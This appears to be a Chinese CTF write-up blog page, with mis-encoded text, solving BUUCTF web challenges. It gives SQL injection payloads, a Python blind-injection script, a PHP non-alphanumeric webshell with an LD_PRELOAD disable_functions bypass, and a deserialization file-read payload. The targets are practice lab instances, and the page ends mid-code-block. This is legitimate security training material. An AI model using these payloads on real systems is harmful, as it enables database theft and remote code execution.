&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; = intval(&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; == &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;index.php?key=123æ‹¿åˆ°flag&lt;/p&gt;
&lt;h2 id=&#34;CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&#34;&gt;&lt;a href=&#34;#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&#34; class=&#34;headerlink&#34; title=&#34;[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World&#34;&gt;&lt;/a&gt;[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;é¢˜ç›®æç¤ºæ˜¯SQLï¼Œå•å¼•å·é—­åˆæ²¡æœ‰ç”¨ï¼ŒåŒå¼•å·åˆè¢«è¿‡æ»¤äº†ï¼ŒçŒœæµ‹æ˜¯æ•°å­—å‹æ³¨å…¥&lt;/li&gt;
&lt;li&gt;æµ‹è¯•å‘ç°0ï¼Œ1ï¼Œ2è¿”å›ç»“æœä¸åŒï¼Œåº”è¯¥å­˜åœ¨boolæ³¨å…¥&lt;/li&gt;
&lt;li&gt;fuzzä¸€ä¸‹æµ‹è¯•è¿‡æ»¤äº†å“ªäº›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0^(ascii(substr((select(flag)from(flag)),1,1))&amp;gt;1)&lt;/code&gt;+&lt;code&gt;0^(ascii(substr((select(flag)from(flag)),1,1))&amp;gt;1000)&lt;/code&gt;ç»“æœä¸åŒï¼Œç›²æ³¨æ‹¿flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;|| 1=1 #&lt;/code&gt;æ‹¿åˆ°adminå¯†ç ï¼šâ€667252cbf386409fcf10e06a81c1c19aâ€œã€‚ç™»é™†ä¹‹åå‘ç°æ²¡å•¥ç”¨&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&amp;#39;%20uniunionon%20seselectlect%201,2,3%23&lt;/code&gt;æµ‹è¯•å¯ä»¥æ³¨å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&amp;#39;%20uniunionon%20seselectlect%201,2,(seselectlect%20table_name%20frfromom%20infoorrmation_schema.tables%20whewherere%20table_schema=database()%20limit%200,1)%23&lt;/code&gt;æ‹¿åˆ°è¡¨å=&amp;gt;â€b4bsqlã€geekuserâ€œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&amp;#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20column_name%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name=&amp;#39;b4bsql&amp;#39;%20limit%200,1)%23 &lt;/code&gt;æ‹¿åˆ°å­—æ®µå=&amp;gt;â€idã€usernameã€passwordâ€&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&amp;#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20passwoorrd%20frfromom%20b4bsql%20limit%207,1)%23&lt;/code&gt;æ‹¿åˆ°flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æŠ¥é”™æ³¨å…¥ï¼Œpayload&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;username&lt;/span&gt;=admin&amp;amp;password=admin%&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;^extractvalue(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;e,(select(right((password),&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;))from(H&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;rDsq&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))))%&lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;flagç”¨leftå’Œrightå‡½æ•°æ‹¼æ¥&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;é¢˜ç›®æç¤ºç›²æ³¨ï¼Œæµ‹è¯•&lt;code&gt;/search.php?id=0^1&lt;/code&gt;å¯ä»¥å‘ç°å­˜åœ¨ç›²æ³¨ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://b766a75e-ee4f-41c7-847a-aac535a77c88.node3.buuoj.cn/search.php?id=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;i,j&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;#payload = url + &amp;quot;0^(ascii(substr((database()),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j) =&amp;gt;&amp;#x27;geek&amp;#x27;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;# payload = url + &amp;quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&amp;#x27;geek&amp;#x27;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j)=&amp;gt;&amp;#x27;F1naI1y,Flaaaaag&amp;#x27;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;# payload = url + &amp;quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&amp;#x27;F1naI1y&amp;#x27;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j)=&amp;gt;&amp;#x27;id,username,password&amp;#x27;&lt;/span&gt;&lt;br&gt;	payload = url + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0^(ascii(substr((select(group_concat(password))from(F1naI1y)),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;format&lt;/span&gt;(i,j)&lt;br&gt;	&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;br&gt;	r = requests.get(payload)&lt;br&gt;	html = r.text&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Click&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; html:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;find&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;	m1n = &lt;span class=&#34;hljs-number&#34;&gt;33&lt;/span&gt;&lt;br&gt;	m4x = &lt;span class=&#34;hljs-number&#34;&gt;126&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; m1n&amp;lt;=m4x:&lt;br&gt;		mid = (m1n+m4x)//&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; get(i,mid):&lt;br&gt;			m1n = mid+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;			m4x = mid-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;chr&lt;/span&gt;((m1n+m4x+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)//&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)&lt;br&gt;&lt;br&gt;flag = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1000&lt;/span&gt;):&lt;br&gt;	a = find(i)&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a==&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;!&amp;#x27;&lt;/span&gt;:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;	flag += a&lt;br&gt;	&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(flag)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag:&amp;quot;&lt;/span&gt;,flag)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;view-source:http://c54f9ea8-ba26-47fa-8c09-58a7a6868706.node3.buuoj.cn/pay.php&lt;/code&gt;çœ‹åˆ°ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;];&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (is_numeric(&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;)) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;password can&amp;#x27;t be number&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;	&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;elseif&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;404&lt;/span&gt;) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Password Right!&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;	&amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;money=1e15&amp;amp;password=404aaa&lt;/code&gt;åŒæ—¶ä¿®æ”¹cookieçš„user=0å˜æˆuser=1å³å¯æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æ— æ•°å­—ã€å­—æ¯shellï¼Œ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/a15803617402/article/details/83589181&#34;&gt;https://blog.csdn.net/a15803617402/article/details/83589181&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/news/186298.html&#34;&gt;https://www.freebuf.com/news/186298.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åˆ©ç”¨LD_PRELOAD+without send_mailç»•è¿‡disable_functionsï¼Œè°ƒç”¨â€™/readflagâ€™æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ”¾ä¸ªpayload&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;?code=&lt;span class=&#34;hljs-variable&#34;&gt;$_&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;`&amp;#123;&amp;#123;&amp;#123;&amp;quot;&lt;/span&gt;^&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;&lt;/span&gt;;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;$_&amp;#125;&lt;/span&gt;[_](&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;$_&amp;#125;&lt;/span&gt;[__]);&amp;amp;_=assert&amp;amp;__=eval(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;])&amp;amp;cmd=&lt;span class=&#34;hljs-regexp&#34;&gt;/readflag&amp;amp;outpath=/&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/tmp/&lt;/span&gt;a&amp;amp;sopath=&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;tmp/disable.so&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç½‘é¼æ¯-2018-Fakebook&#34;&gt;&lt;a href=&#34;#ç½‘é¼æ¯-2018-Fakebook&#34; class=&#34;headerlink&#34; title=&#34;[ç½‘é¼æ¯ 2018]Fakebook&#34;&gt;&lt;/a&gt;[ç½‘é¼æ¯ 2018]Fakebook&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1&lt;/code&gt;å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œç”¨å•å¼•å·æµ‹è¯•å‘ç°æŠ¥é”™ã€‚æµ‹è¯•åå‘ç°æ˜¯æ•´å‹æ³¨å…¥ï¼Œå°è¯•&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0^1&lt;/code&gt;å’Œ&lt;code&gt;0^0&lt;/code&gt;æ³¨å…¥æˆåŠŸ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è™½ç„¶å¯ä»¥ç›²æ³¨ï¼Œä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œæ—¢ç„¶æœ‰æŠ¥é”™å°±å°è¯•æŠ¥é”™æ³¨å…¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20database())),1)&lt;/code&gt;æ‹¿åˆ°äº†æ•°æ®åº“å=&amp;gt;â€fakebookâ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27)),1)&lt;/code&gt;æ‹¿åˆ°è¡¨å=&amp;gt;â€usersâ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)),1)&lt;/code&gt;æ‹¿åˆ°å­—æ®µå=&amp;gt;â€no,username,passwd,dataâ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20substr(data,61,30)%20from%20fakebook.users)),1)&lt;/code&gt;æ‹¿æ•°æ®â€1ï¼Œm1n,3c9909afec25354d551dae21590bb2,&lt;code&gt;O:8:&amp;quot;UserInfo&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:3:&amp;quot;m1n&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;s:4:&amp;quot;blog&amp;quot;;s:6:&amp;quot;m1n.me&amp;quot;;&amp;#125;&lt;/code&gt;â€œï¼Œå‘ç°ä¸€æ®µååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ã€‚æ˜¯æˆ‘åˆšåˆšæ³¨å†Œçš„ä¿¡æ¯&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä¸å¤ªæ‡‚æœ‰å•¥ç”¨ï¼Œå°è¯•æ‰«åå°ï¼Œæ‰«åˆ°robots.txtï¼Œ/user.php.bakæ‹¿åˆ°æºç &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ„é€ &lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0/**/union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&amp;#123;s:4:%22name%22;s:3:%22m1n%22;s:3:%22age%22;i:18;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&amp;#125;%27&lt;/code&gt;å°±å¯ä»¥è¯»åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ZJCTF-2019-NiZhuanSiWei&#34;&gt;&lt;a href=&#34;#ZJCTF-2019-NiZhuanSiWei&#34; class=&#34;headerlink&#34; title=&#34;[ZJCTF 2019]NiZhuanSiWei&#34;&gt;&lt;/a&gt;[ZJCTF 2019]NiZhuanSiWei&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 